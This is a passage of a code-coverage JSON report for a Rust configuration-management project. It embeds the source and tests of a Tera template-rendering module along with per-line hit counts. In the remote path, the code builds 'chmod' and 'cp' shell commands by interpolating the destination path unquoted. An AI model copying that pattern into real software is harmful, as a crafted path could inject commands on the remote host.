address":[29942983,29942058,29943104],"length":1,"stats":{"Line":2}},{"line":90,"address":[29942948],"length":1,"stats":{"Line":1}},{"line":92,"address":[29942917],"length":1,"stats":{"Line":1}},{"line":94,"address":[29942962,29943040],"length":1,"stats":{"Line":1}},{"line":101,"address":[29943389],"length":1,"stats":{"Line":1}},{"line":103,"address":[29943227],"length":1,"stats":{"Line":1}},{"line":104,"address":[29943247],"length":1,"stats":{"Line":1}},{"line":105,"address":[29943267],"length":1,"stats":{"Line":1}},{"line":106,"address":[29943287],"length":1,"stats":{"Line":1}},{"line":107,"address":[29943308],"length":1,"stats":{"Line":1}},{"line":114,"address":[29943463],"length":1,"stats":{"Line":1}},{"line":115,"address":[29943483],"length":1,"stats":{"Line":1}},{"line":116,"address":[29943503],"length":1,"stats":{"Line":1}},{"line":119,"address":[29946811,29944888,29945575,29945391,29943876,29944362,29944670,29945106,29944196,29946569,29943543,29945321,29949040,29943783,29945793,29946804,29943903,29946229,29946011,29944389,29946576],"length":1,"stats":{"Line":6}},{"line":121,"address":[29943766,29943837],"length":1,"stats":{"Line":2}},{"line":122,"address":[29944240,29944169],"length":1,"stats":{"Line":2}},{"line":126,"address":[29945367,29945309],"length":1,"stats":{"Line":2}},{"line":132,"address":[29946536],"length":1,"stats":{"Line":1}},{"line":133,"address":[29946771],"length":1,"stats":{"Line":1}},{"line":137,"address":[29947079,29947102],"length":1,"stats":{"Line":2}},{"line":138,"address":[29947160,29947224],"length":1,"stats":{"Line":2}},{"line":139,"address":[29947470,29947397],"length":1,"stats":{"Line":2}},{"line":140,"address":[29947530,29947583,29947618],"length":1,"stats":{"Line":2}},{"line":145,"address":[29947083,29947832],"length":1,"stats":{"Line":2}},{"line":146,"address":[29947862,29947952],"length":1,"stats":{"Line":0}},{"line":147,"address":[29947984,29948057],"length":1,"stats":{"Line":0}},{"line":148,"address":[29948427],"length":1,"stats":{"Line":0}},{"line":149,"address":[29948170,29948117],"length":1,"stats":{"Line":0}},{"line":150,"address":[29948257,29948388,29948186],"length":1,"stats":{"Line":0}},{"line":157,"address":[29947805,29948695],"length":1,"stats":{"Line":2}},{"line":158,"address":[29948869],"length":1,"stats":{"Line":1}},{"line":163,"address":[29951484,29949312,29951490],"length":1,"stats":{"Line":1}},{"line":166,"address":[29949424,29949542,29949389],"length":1,"stats":{"Line":2}},{"line":167,"address":[30746555,30746528],"length":1,"stats":{"Line":1}},{"line":169,"address":[29949585],"length":1,"stats":{"Line":1}},{"line":170,"address":[29949645,29949761,29949842],"length":1,"stats":{"Line":2}},{"line":171,"address":[29949738,29949810],"length":1,"stats":{"Line":1}},{"line":173,"address":[29949883,29949991],"length":1,"stats":{"Line":2}},{"line":174,"address":[29950007],"length":1,"stats":{"Line":1}},{"line":175,"address":[29950089],"length":1,"stats":{"Line":0}},{"line":176,"address":[29951180],"length":1,"stats":{"Line":0}},{"line":178,"address":[29950103,29950050],"length":1,"stats":{"Line":2}},{"line":180,"address":[29950142],"length":1,"stats":{"Line":1}},{"line":181,"address":[29950836],"length":1,"stats":{"Line":1}},{"line":182,"address":[29950843],"length":1,"stats":{"Line":1}},{"line":183,"address":[29950990],"length":1,"stats":{"Line":1}},{"line":185,"address":[29950168,29950119],"length":1,"stats":{"Line":0}},{"line":187,"address":[29950206],"length":1,"stats":{"Line":0}},{"line":188,"address":[29950484],"length":1,"stats":{"Line":0}},{"line":189,"address":[29950491],"length":1,"stats":{"Line":0}},{"line":190,"address":[29950638],"length":1,"stats":{"Line":0}},{"line":192,"address":[29950228,29950179],"length":1,"stats":{"Line":0}}],"covered":58,"coverable":75},{"path":["/","home","artur","Repositories","rustible","src","modules","template.rs"],"content":"//! Template module - Render templates with Tera\n//!\n//! This module renders Tera templates (similar to Jinja2) and copies the result\n//! to a destination file. Supports both local and remote execution via async connections.\n\nuse super::{\n    Diff, Module, ModuleClassification, ModuleContext, ModuleError, ModuleOutput, ModuleParams,\n    ModuleResult, ParamExt,\n};\nuse crate::connection::TransferOptions;\nuse once_cell::sync::Lazy;\nuse std::collections::HashMap;\nuse std::fs;\nuse std::io::Read;\nuse std::os::unix::fs::{MetadataExt, PermissionsExt};\nuse std::path::Path;\nuse tera::{Context as TeraContext, Tera};\nuse tokio::runtime::Handle;\n\n/// Global Tera instance with pre-registered filters\nstatic BASE_TERA: Lazy\u003cTera\u003e = Lazy::new(|| {\n    let mut tera = Tera::default();\n\n    // Add custom filters similar to Ansible/Jinja2\n    tera.register_filter(\n        \"default\",\n        |value: \u0026tera::Value, args: \u0026HashMap\u003cString, tera::Value\u003e| {\n            if value.is_null() || (value.is_string() \u0026\u0026 value.as_str().unwrap().is_empty()) {\n                if let Some(default) = args.get(\"value\") {\n                    return Ok(default.clone());\n                }\n            }\n            Ok(value.clone())\n        },\n    );\n\n    tera.register_filter(\n        \"upper\",\n        |value: \u0026tera::Value, _args: \u0026HashMap\u003cString, tera::Value\u003e| match value {\n            tera::Value::String(s) =\u003e Ok(tera::Value::String(s.to_uppercase())),\n            _ =\u003e Ok(value.clone()),\n        },\n    );\n\n    tera.register_filter(\n        \"lower\",\n        |value: \u0026tera::Value, _args: \u0026HashMap\u003cString, tera::Value\u003e| match value {\n            tera::Value::String(s) =\u003e Ok(tera::Value::String(s.to_lowercase())),\n            _ =\u003e Ok(value.clone()),\n        },\n    );\n\n    tera.register_filter(\n        \"trim\",\n        |value: \u0026tera::Value, _args: \u0026HashMap\u003cString, tera::Value\u003e| match value {\n            tera::Value::String(s) =\u003e Ok(tera::Value::String(s.trim().to_string())),\n            _ =\u003e Ok(value.clone()),\n        },\n    );\n\n    tera.register_filter(\n        \"replace\",\n        |value: \u0026tera::Value, args: \u0026HashMap\u003cString, tera::Value\u003e| match value {\n            tera::Value::String(s) =\u003e {\n                let from = args.get(\"from\").and_then(|v| v.as_str()).unwrap_or(\"\");\n                let to = args.get(\"to\").and_then(|v| v.as_str()).unwrap_or(\"\");\n                Ok(tera::Value::String(s.replace(from, to)))\n            }\n            _ =\u003e Ok(value.clone()),\n        },\n    );\n\n    tera.register_filter(\n        \"join\",\n        |value: \u0026tera::Value, args: \u0026HashMap\u003cString, tera::Value\u003e| match value {\n            tera::Value::Array(arr) =\u003e {\n                let sep = args.get(\"sep\").and_then(|v| v.as_str()).unwrap_or(\",\");\n                let joined: Vec\u003cString\u003e = arr\n                    .iter()\n                    .map(|v| match v {\n                        tera::Value::String(s) =\u003e s.clone(),\n                        _ =\u003e v.to_string(),\n                    })\n                    .collect();\n                Ok(tera::Value::String(joined.join(sep)))\n            }\n            _ =\u003e Ok(value.clone()),\n        },\n    );\n\n    tera\n});\n\n/// Module for rendering templates\npub struct TemplateModule;\n\nimpl TemplateModule {\n    fn build_tera_context(\n        context: \u0026ModuleContext,\n        extra_vars: Option\u003c\u0026serde_json::Value\u003e,\n    ) -\u003e TeraContext {\n        let mut tera_ctx = TeraContext::new();\n\n        // Add variables\n        for (key, value) in \u0026context.vars {\n            tera_ctx.insert(key, value);\n        }\n\n        // Add facts\n        tera_ctx.insert(\"ansible_facts\", \u0026context.facts);\n        for (key, value) in \u0026context.facts {\n            tera_ctx.insert(key, value);\n        }\n\n        // Add extra variables if provided\n        if let Some(serde_json::Value::Object(vars)) = extra_vars {\n            for (key, value) in vars {\n                tera_ctx.insert(key, value);\n            }\n        }\n\n        tera_ctx\n    }\n\n    fn render_template(template_content: \u0026str, tera_ctx: \u0026TeraContext) -\u003e ModuleResult\u003cString\u003e {\n        // Clone the base Tera instance to reuse registered filters\n        // This is significantly faster than creating a new instance and registering filters each time\n        let mut tera = BASE_TERA.clone();\n\n        tera.add_raw_template(\"template\", template_content)\n            .map_err(|e| ModuleError::TemplateError(format!(\"Failed to parse template: {}\", e)))?;\n\n        tera.render(\"template\", tera_ctx)\n            .map_err(|e| ModuleError::TemplateError(format!(\"Failed to render template: {}\", e)))\n    }\n\n    #[allow(dead_code)]\n    fn get_file_checksum(path: \u0026Path) -\u003e std::io::Result\u003cString\u003e {\n        use std::collections::hash_map::DefaultHasher;\n        use std::hash::{Hash, Hasher};\n\n        let mut file = fs::File::open(path)?;\n        let mut contents = Vec::new();\n        file.read_to_end(\u0026mut contents)?;\n\n        let mut hasher = DefaultHasher::new();\n        contents.hash(\u0026mut hasher);\n        Ok(format!(\"{:x}\", hasher.finish()))\n    }\n\n    fn create_backup(dest: \u0026Path, backup_suffix: \u0026str) -\u003e ModuleResult\u003cOption\u003cString\u003e\u003e {\n        if dest.exists() {\n            let backup_path = format!(\"{}{}\", dest.display(), backup_suffix);\n            fs::copy(dest, \u0026backup_path)?;\n            Ok(Some(backup_path))\n        } else {\n            Ok(None)\n        }\n    }\n\n    fn set_permissions(path: \u0026Path, mode: Option\u003cu32\u003e) -\u003e ModuleResult\u003cbool\u003e {\n        if let Some(mode) = mode {\n            let current = fs::metadata(path)?.permissions().mode() \u0026 0o7777;\n            if current != mode {\n                fs::set_permissions(path, fs::Permissions::from_mode(mode))?;\n                return Ok(true);\n            }\n        }\n        Ok(false)\n    }\n\n    /// Execute template rendering locally (when no connection is present)\n    fn execute_local(\n        params: \u0026ModuleParams,\n        context: \u0026ModuleContext,\n        rendered: \u0026str,\n        src_path: \u0026Path,\n        dest_path: \u0026Path,\n        backup: bool,\n        backup_suffix: \u0026str,\n        mode: Option\u003cu32\u003e,\n    ) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        let src = params.get_string_required(\"src\")?;\n        let dest = params.get_string_required(\"dest\")?;\n\n        // Check if dest needs updating\n        let needs_update = if dest_path.exists() {\n            let current_content = fs::read_to_string(dest_path)?;\n            current_content != rendered\n        } else {\n            true\n        };\n\n        if !needs_update {\n            // Check if only permissions need updating\n            let perm_changed = if let Some(m) = mode {\n                if dest_path.exists() {\n                    let current = fs::metadata(dest_path)?.permissions().mode() \u0026 0o7777;\n                    current != m\n                } else {\n                    false\n                }\n            } else {\n                false\n            };\n\n            if perm_changed {\n                if context.check_mode {\n                    return Ok(ModuleOutput::changed(format!(\n                        \"Would change permissions on '{}'\",\n                        dest\n                    )));\n                }\n                Self::set_permissions(dest_path, mode)?;\n                return Ok(ModuleOutput::changed(format!(\n                    \"Changed permissions on '{}'\",\n                    dest\n                )));\n            }\n\n            return Ok(ModuleOutput::ok(format!(\n                \"Template '{}' is already up to date\",\n                dest\n            )));\n        }\n\n        // In check mode, return what would happen\n        if context.check_mode {\n            let diff = if context.diff_mode {\n                let before = if dest_path.exists() {\n                    fs::read_to_string(dest_path).unwrap_or_default()\n                } else {\n                    String::new()\n                };\n                Some(Diff::new(before, rendered.to_string()))\n            } else {\n                None\n            };\n\n            let mut output =\n                ModuleOutput::changed(format!(\"Would render template '{}' to '{}'\", src, dest));\n\n            if let Some(d) = diff {\n                output = output.with_diff(d);\n            }\n\n            return Ok(output);\n        }\n\n        // Create backup if requested\n        let backup_file = if backup {\n            Self::create_backup(dest_path, backup_suffix)?\n        } else {\n            None\n        };\n\n        // Create parent directories if needed\n        if let Some(parent) = dest_path.parent() {\n            if !parent.exists() {\n                fs::create_dir_all(parent)?;\n            }\n        }\n\n        // Write rendered content\n        fs::write(dest_path, rendered)?;\n\n        // Set permissions\n        let perm_changed = Self::set_permissions(dest_path, mode)?;\n\n        let mut output =\n            ModuleOutput::changed(format!(\"Rendered template '{}' to '{}'\", src, dest));\n\n        if let Some(backup_path) = backup_file {\n            output = output.with_data(\"backup_file\", serde_json::json!(backup_path));\n        }\n\n        if perm_changed {\n            output = output.with_data(\"mode_changed\", serde_json::json!(true));\n        }\n\n        // Add file info to output\n        let meta = fs::metadata(dest_path)?;\n        output = output\n            .with_data(\"dest\", serde_json::json!(dest))\n            .with_data(\"src\", serde_json::json!(src))\n            .with_data(\"size\", serde_json::json!(meta.len()))\n            .with_data(\n                \"mode\",\n                serde_json::json!(format!(\"{:o}\", meta.permissions().mode() \u0026 0o7777)),\n            )\n            .with_data(\"uid\", serde_json::json!(meta.uid()))\n            .with_data(\"gid\", serde_json::json!(meta.gid()));\n\n        let _ = src_path; // Suppress unused warning\n        Ok(output)\n    }\n}\n\nimpl Module for TemplateModule {\n    fn name(\u0026self) -\u003e \u0026'static str {\n        \"template\"\n    }\n\n    fn description(\u0026self) -\u003e \u0026'static str {\n        \"Render Tera/Jinja2 templates to a destination\"\n    }\n\n    fn classification(\u0026self) -\u003e ModuleClassification {\n        ModuleClassification::NativeTransport\n    }\n\n    fn required_params(\u0026self) -\u003e \u0026[\u0026'static str] {\n        \u0026[\"src\", \"dest\"]\n    }\n\n    fn execute(\n        \u0026self,\n        params: \u0026ModuleParams,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        let src = params.get_string_required(\"src\")?;\n        let dest = params.get_string_required(\"dest\")?;\n        let src_path = Path::new(\u0026src);\n        let dest_path = Path::new(\u0026dest);\n        let backup = params.get_bool_or(\"backup\", false);\n        let backup_suffix = params\n            .get_string(\"backup_suffix\")?\n            .unwrap_or_else(|| \"~\".to_string());\n        let mode = params.get_u32(\"mode\")?;\n        let extra_vars = params.get(\"vars\");\n\n        // Check source exists (template source is always on control node)\n        if !src_path.exists() {\n            return Err(ModuleError::ExecutionFailed(format!(\n                \"Template source '{}' does not exist\",\n                src\n            )));\n        }\n\n        // Read template content from control node\n        let template_content = fs::read_to_string(src_path).map_err(ModuleError::Io)?;\n\n        // Build context and render\n        let tera_ctx = Self::build_tera_context(context, extra_vars);\n        let rendered = Self::render_template(\u0026template_content, \u0026tera_ctx)?;\n\n        // Check if we have a connection for remote execution\n        if let Some(ref conn) = context.connection {\n            // Remote execution via async connection\n            let handle = Handle::try_current().map_err(|e| {\n                ModuleError::ExecutionFailed(format!(\"No tokio runtime available: {}\", e))\n            })?;\n\n            // Get current content from remote to check if update is needed\n            let current_content = handle.block_on(async {\n                if conn.path_exists(dest_path).await.unwrap_or(false) {\n                    conn.download_content(dest_path)\n                        .await\n                        .ok()\n                        .and_then(|bytes| String::from_utf8(bytes).ok())\n                } else {\n                    None\n                }\n            });\n\n            let needs_update = match \u0026current_content {\n                Some(content) =\u003e content != \u0026rendered,\n                None =\u003e true,\n            };\n\n            if !needs_update {\n                // Check if only permissions need updating\n                let perm_changed = if let Some(m) = mode {\n                    let stat_result = handle.block_on(async { conn.stat(dest_path).await });\n                    if let Ok(stat) = stat_result {\n                        (stat.mode \u0026 0o7777) != m\n                    } else {\n                        false\n                    }\n                } else {\n                    false\n                };\n\n                if perm_changed {\n                    if context.check_mode {\n                        return Ok(ModuleOutput::changed(format!(\n                            \"Would change permissions on '{}'\",\n                            dest\n                        )));\n                    }\n                    // Set permissions via chmod command on remote\n                    let chmod_cmd = format!(\"chmod {:o} {}\", mode.unwrap(), dest);\n                    handle\n                        .block_on(async { conn.execute(\u0026chmod_cmd, None).await })\n                        .map_err(|e| {\n                            ModuleError::ExecutionFailed(format!(\n                                \"Failed to set permissions: {}\",\n                                e\n                            ))\n                        })?;\n                    return Ok(ModuleOutput::changed(format!(\n                        \"Changed permissions on '{}'\",\n                        dest\n                    )));\n                }\n\n                return Ok(ModuleOutput::ok(format!(\n                    \"Template '{}' is already up to date\",\n                    dest\n                )));\n            }\n\n            // In check mode, return what would happen\n            if context.check_mode {\n                let diff = if context.diff_mode {\n                    let before = current_content.unwrap_or_default();\n                    Some(Diff::new(before, rendered.clone()))\n                } else {\n                    None\n                };\n\n                let mut output =\n                    ModuleOutput::changed(format!(\"Would render template '{}' to '{}'\", src, dest));\n\n                if let Some(d) = diff {\n                    output = output.with_diff(d);\n                }\n\n                return Ok(output);\n            }\n\n            // Create backup if requested (via remote command)\n            let backup_file = if backup \u0026\u0026 current_content.is_some() {\n                let backup_path = format!(\"{}{}\", dest, backup_suffix);\n                let cp_cmd = format!(\"cp {} {}\", dest, backup_path);\n                handle\n                    .block_on(async { conn.execute(\u0026cp_cmd, None).await })\n                    .map_err(|e| {\n                        ModuleError::ExecutionFailed(format!(\"Failed to create backup: {}\", e))\n                    })?;\n                Some(backup_path)\n            } else {\n                None\n            };\n\n            // Build transfer options\n            let transfer_opts = TransferOptions {\n                mode,\n                create_dirs: true,\n                backup: false, // We already handled backup above\n                ..Default::default()\n            };\n\n            // Upload rendered content to remote\n            handle\n                .block_on(async {\n                    conn.upload_content(rendered.as_bytes(), dest_path, Some(transfer_opts))\n                        .await\n                })\n                .map_err(|e| {\n                    ModuleError::ExecutionFailed(format!(\"Failed to upload template: {}\", e))\n                })?;\n\n            let mut output =\n                ModuleOutput::changed(format!(\"Rendered template '{}' to '{}'\", src, dest));\n\n            if let Some(backup_path) = backup_file {\n                output = output.with_data(\"backup_file\", serde_json::json!(backup_path));\n            }\n\n            // Get file info from remote\n            if let Ok(stat) = handle.block_on(async { conn.stat(dest_path).await }) {\n                output = output\n                    .with_data(\"dest\", serde_json::json!(dest))\n                    .with_data(\"src\", serde_json::json!(src))\n                    .with_data(\"size\", serde_json::json!(stat.size))\n                    .with_data(\n                        \"mode\",\n                        serde_json::json!(format!(\"{:o}\", stat.mode \u0026 0o7777)),\n                    )\n                    .with_data(\"uid\", serde_json::json!(stat.uid))\n                    .with_data(\"gid\", serde_json::json!(stat.gid));\n            }\n\n            Ok(output)\n        } else {\n            // Local execution (no connection)\n            Self::execute_local(\n                params,\n                context,\n                \u0026rendered,\n                src_path,\n                dest_path,\n                backup,\n                \u0026backup_suffix,\n                mode,\n            )\n        }\n    }\n\n    fn check(\u0026self, params: \u0026ModuleParams, context: \u0026ModuleContext) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        let check_context = ModuleContext {\n            check_mode: true,\n            ..context.clone()\n        };\n        self.execute(params, \u0026check_context)\n    }\n\n    fn diff(\u0026self, params: \u0026ModuleParams, context: \u0026ModuleContext) -\u003e ModuleResult\u003cOption\u003cDiff\u003e\u003e {\n        let src = params.get_string_required(\"src\")?;\n        let dest = params.get_string_required(\"dest\")?;\n        let src_path = Path::new(\u0026src);\n        let dest_path = Path::new(\u0026dest);\n        let extra_vars = params.get(\"vars\");\n\n        if !src_path.exists() {\n            return Err(ModuleError::ExecutionFailed(format!(\n                \"Template source '{}' does not exist\",\n                src\n            )));\n        }\n\n        let template_content = fs::read_to_string(src_path)?;\n        let tera_ctx = Self::build_tera_context(context, extra_vars);\n        let rendered = Self::render_template(\u0026template_content, \u0026tera_ctx)?;\n\n        // Check if we have a connection for remote diff\n        if let Some(ref conn) = context.connection {\n            let handle = Handle::try_current().map_err(|e| {\n                ModuleError::ExecutionFailed(format!(\"No tokio runtime available: {}\", e))\n            })?;\n\n            let before = handle.block_on(async {\n                if conn.path_exists(dest_path).await.unwrap_or(false) {\n                    conn.download_content(dest_path)\n                        .await\n                        .ok()\n                        .and_then(|bytes| String::from_utf8(bytes).ok())\n                        .unwrap_or_default()\n                } else {\n                    String::new()\n                }\n            });\n\n            Ok(Some(Diff::new(before, rendered)))\n        } else {\n            // Local diff\n            let before = if dest_path.exists() {\n                fs::read_to_string(dest_path).unwrap_or_default()\n            } else {\n                String::new()\n            };\n\n            Ok(Some(Diff::new(before, rendered)))\n        }\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n    use std::collections::HashMap;\n    use tempfile::TempDir;\n\n    #[test]\n    fn test_template_basic() {\n        let temp = TempDir::new().unwrap();\n        let src = temp.path().join(\"template.txt.j2\");\n        let dest = temp.path().join(\"output.txt\");\n\n        fs::write(\u0026src, \"Hello, {{ name }}!\").unwrap();\n\n        let module = TemplateModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\"src\".to_string(), serde_json::json!(src.to_str().unwrap()));\n        params.insert(\n            \"dest\".to_string(),\n            serde_json::json!(dest.to_str().unwrap()),\n        );\n\n        let mut vars = HashMap::new();\n        vars.insert(\"name\".to_string(), serde_json::json!(\"World\"));\n\n        let context = ModuleContext::default().with_vars(vars);\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(result.changed);\n        assert!(dest.exists());\n        assert_eq!(fs::read_to_string(\u0026dest).unwrap(), \"Hello, World!\");\n    }\n\n    #[test]\n    fn test_template_with_loops() {\n        let temp = TempDir::new().unwrap();\n        let src = temp.path().join(\"template.txt.j2\");\n        let dest = temp.path().join(\"output.txt\");\n\n        fs::write(\u0026src, \"{% for item in items %}{{ item }}\\n{% endfor %}\").unwrap();\n\n        let module = TemplateModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\"src\".to_string(), serde_json::json!(src.to_str().unwrap()));\n        params.insert(\n            \"dest\".to_string(),\n            serde_json::json!(dest.to_str().unwrap()),\n        );\n\n        let mut vars = HashMap::new();\n        vars.insert(\n            \"items\".to_string(),\n            serde_json::json!([\"one\", \"two\", \"three\"]),\n        );\n\n        let context = ModuleContext::default().with_vars(vars);\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(result.changed);\n        assert_eq!(fs::read_to_string(\u0026dest).unwrap(), \"one\\ntwo\\nthree\\n\");\n    }\n\n    #[test]\n    fn test_template_with_conditionals() {\n        let temp = TempDir::new().unwrap();\n        let src = temp.path().join(\"template.txt.j2\");\n        let dest = temp.path().join(\"output.txt\");\n\n        fs::write(\n            \u0026src,\n            \"{% if enabled %}Feature enabled{% else %}Feature disabled{% endif %}\",\n        )\n        .unwrap();\n\n        let module = TemplateModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\"src\".to_string(), serde_json::json!(src.to_str().unwrap()));\n        params.insert(\n            \"dest\".to_string(),\n            serde_json::json!(dest.to_str().unwrap()),\n        );\n\n        let mut vars = HashMap::new();\n        vars.insert(\"enabled\".to_string(), serde_json::json!(true));\n\n        let context = ModuleContext::default().with_vars(vars);\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(result.changed);\n        assert_eq!(fs::read_to_string(\u0026dest).unwrap(), \"Feature enabled\");\n    }\n\n    #[test]\n    fn test_template_idempotent() {\n        let temp = TempDir::new().unwrap();\n        let src = temp.path().join(\"template.txt.j2\");\n        let dest = temp.path().join(\"output.txt\");\n\n        fs::write(\u0026src, \"Hello, {{ name }}!\").unwrap();\n        fs::write(\u0026dest, \"Hello, World!\").unwrap();\n\n        let module = TemplateModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\"src\".to_string(), serde_json::json!(src.to_str().unwrap()));\n        params.insert(\n            \"dest\".to_string(),\n            serde_json::json!(dest.to_str().unwrap()),\n        );\n\n        let mut vars = HashMap::new();\n        vars.insert(\"name\".to_string(), serde_json::json!(\"World\"));\n\n        let context = ModuleContext::default().with_vars(vars);\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(!result.changed);\n    }\n\n    #[test]\n    fn test_template_check_mode() {\n        let temp = TempDir::new().unwrap();\n        let src = temp.path().join(\"template.txt.j2\");\n        let dest = temp.path().join(\"output.txt\");\n\n        fs::write(\u0026src, \"Hello, {{ name }}!\").unwrap();\n\n        let module = TemplateModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\"src\".to_string(), serde_json::json!(src.to_str().unwrap()));\n        params.insert(\n            \"dest\".to_string(),\n            serde_json::json!(dest.to_str().unwrap()),\n        );\n\n        let mut vars = HashMap::new();\n        vars.insert(\"name\".to_string(), serde_json::json!(\"World\"));\n\n        let context = ModuleContext::default()\n            .with_vars(vars)\n            .with_check_mode(true);\n        let result = module.check(\u0026params, \u0026context).unwrap();\n\n        assert!(result.changed);\n        assert!(result.msg.contains(\"Would render\"));\n        assert!(!dest.exists()); // File should not be created in check mode\n    }\n\n    #[test]\n    fn test_template_filters() {\n        let temp = TempDir::new().unwrap();\n        let src = temp.path().join(\"template.txt.j2\");\n        let dest = temp.path().join(\"output.txt\");\n\n        fs::write(\u0026src, \"{{ name | upper }}\").unwrap();\n\n        let module = TemplateModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\"src\".to_string(), serde_json::json!(src.to_str().unwrap()));\n        params.insert(\n            \"dest\".to_string(),\n            serde_json::json!(dest.to_str().unwrap()),\n        );\n\n        let mut vars = HashMap::new();\n        vars.insert(\"name\".to_string(), serde_json::json!(\"hello\"));\n\n        let context = ModuleContext::default().with_vars(vars);\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(result.changed);\n        assert_eq!(fs::read_to_string(\u0026dest).unwrap(), \"HELLO\");\n    }\n}\n","traces":[{"line":21,"address":[31022548,31022554,31022288],"length":1,"stats":{"Line":1}},{"line":22,"address":[31022312],"length":1,"stats":{"Line":1}},{"line":25,"address":[31022336],"length":1,"stats":{"Line":1}},{"line":27,"address":[31024128],"length":1,"stats":{"Line":0}},{"line":28,"address":[31024177,31024325],"length":1,"stats":{"Line":0}},{"line":29,"address":[31024208,31024371],"length":1,"stats":{"Line":0}},{"line":30,"address":[31024384],"length":1,"stats":{"Line":0}},{"line":33,"address":[31024264],"length":1,"stats":{"Line":0}},{"line":37,"address":[31022396],"length":1,"stats":{"Line":1}},{"line":39,"address":[31024464,31024507],"length":1,"stats":{"Line":2}},{"line":40,"address":[31024521],"length":1,"stats":{"Line":1}},{"line":41,"address":[31024638],"length":1,"stats":{"Line":0}},{"line":45,"address":[31022420],"length":1,"stats":{"Line":1}},{"line":47,"address":[31023195,31023152],"length":1,"stats":{"Line":0}},{"line":48,"address":[31023209],"length":1,"stats":{"Line":0}},{"line":49,"address":[31023326],"length":1,"stats":{"Line":0}},{"line":53,"address":[31022444],"length":1,"stats":{"Line":1}},{"line":55,"address":[31023915,31023872],"length":1,"stats":{"Line":0}},{"line":56,"address":[31023933],"length":1,"stats":{"Line":0}},{"line":57,"address":[31024061],"length":1,"stats":{"Line":0}},{"line":61,"address":[31022468],"length":1,"stats":{"Line":1}},{"line":63,"address":[31023408,31023459],"length":1,"stats":{"Line":0}},{"line":64,"address":[31023482],"length":1,"stats":{"Line":0}},{"line":65,"address":[31024752,31024761,31023499],"length":1,"stats":{"Line":0}},{"line":66,"address":[31023577,31024880,31024889],"length":1,"stats":{"Line":0}},{"line":67,"address":[31023655],"length":1,"stats":{"Line":0}},{"line":69,"address":[31023787],"length":1,"stats":{"Line":0}},{"line":73,"address":[31022492],"length":1,"stats":{"Line":1}},{"line":75,"address":[31023128,31022627,31023122,31022576],"length":1,"stats":{"Line":0}},{"line":76,"address":[31022650],"length":1,"stats":{"Line":0}},{"line":77,"address":[31024720,31022667,31024729],"length":1,"stats":{"Line":0}},{"line":78,"address":[31022760],"length":1,"stats":{"Line":0}},{"line":79,"address":[31022775],"length":1,"stats":{"Line":0}},{"line":80,"address":[31024813,31022790,31024784],"length":1,"stats":{"Line":0}},{"line":81,"address":[31024832],"length":1,"stats":{"Line":0}},{"line":82,"address":[31024859],"length":1,"stats":{"Line":0}},{"line":84,"address":[31022808],"length":1,"stats":{"Line":0}},{"line":85,"address":[31022818,31022979],"length":1,"stats":{"Line":0}},{"line":87,"address":[31022844],"length":1,"stats":{"Line":0}},{"line":91,"address":[31022520],"length":1,"stats":{"Line":1}},{"line":98,"address":[28969200,28969194,28968416],"length":1,"stats":{"Line":1}},{"line":102,"address":[28968451],"length":1,"stats":{"Line":1}},{"line":105,"address":[28968531,28968470],"length":1,"stats":{"Line":2}},{"line":106,"address":[28968677,28969189],"length":1,"stats":{"Line":2}},{"line":110,"address":[28968692],"length":1,"stats":{"Line":1}},{"line":111,"address":[28968725],"length":1,"stats":{"Line":1}},{"line":112,"address":[28968897,28969184],"length":1,"stats":{"Line":0}},{"line":116,"address":[28968907,28968993],"length":1,"stats":{"Line":1}},{"line":117,"address":[28969018],"length":1,"stats":{"Line":0}},{"line":118,"address":[28969172],"length":1,"stats":{"Line":0}},{"line":122,"address":[28968959],"length":1,"stats":{"Line":1}},{"line":125,"address":[28967233,28966816,28967227],"length":1,"stats":{"Line":1}},{"line":128,"address":[28966871],"length":1,"stats":{"Line":1}},{"line":130,"address":[28967108,28967027,28966916],"length":1,"stats":{"Line":2}},{"line":131,"address":[28967076,28967004],"length":1,"stats":{"Line":1}},{"line":133,"address":[28967134],"length":1,"stats":{"Line":1}},{"line":134,"address":[28967183],"length":1,"stats":{"Line":1}},{"line":138,"address":[28967712,28968394,28968400],"length":1,"stats":{"Line":0}},{"line":142,"address":[28967745],"length":1,"stats":{"Line":0}},{"line":143,"address":[28967835],"length":1,"stats":{"Line":0}},{"line":144,"address":[28967892,28967971],"length":1,"stats":{"Line":0}},{"line":146,"address":[28968098],"length":1,"stats":{"Line":0}},{"line":147,"address":[28968105],"length":1,"stats":{"Line":0}},{"line":148,"address":[28968137],"length":1,"stats":{"Line":0}},{"line":151,"address":[28959197,28958448,28959203],"length":1,"stats":{"Line":0}},{"line":152,"address":[28959176,28958517,28958598],"length":1,"stats":{"Line":0}},{"line":153,"address":[28958613],"length":1,"stats":{"Line":0}},{"line":154,"address":[28958838,28958919],"length":1,"stats":{"Line":0}},{"line":155,"address":[28959037],"length":1,"stats":{"Line":0}},{"line":157,"address":[28958531],"length":1,"stats":{"Line":0}},{"line":161,"address":[28967248],"length":1,"stats":{"Line":1}},{"line":162,"address":[28967300],"length":1,"stats":{"Line":1}},{"line":163,"address":[28967337,28967435],"length":1,"stats":{"Line":0}},{"line":164,"address":[28967557],"length":1,"stats":{"Line":0}},{"line":165,"address":[28967569],"length":1,"stats":{"Line":0}},{"line":166,"address":[28967679],"length":1,"stats":{"Line":0}},{"line":169,"address":[28967408],"length":1,"stats":{"Line":1}},{"line":173,"address":[28966802,28959216,28963625],"length":1,"stats":{"Line":1}},{"line":183,"address":[28959507],"length":1,"stats":{"Line":1}},{"line":184,"address":[28959934,28966800,28959847],"length":1,"stats":{"Line":2}},{"line":187,"address":[28960123,28960202,28960188],"length":1,"stats":{"Line":3}},{"line":188,"address":[28960258,28960220,28966776],"length":1,"stats":{"Line":2}},{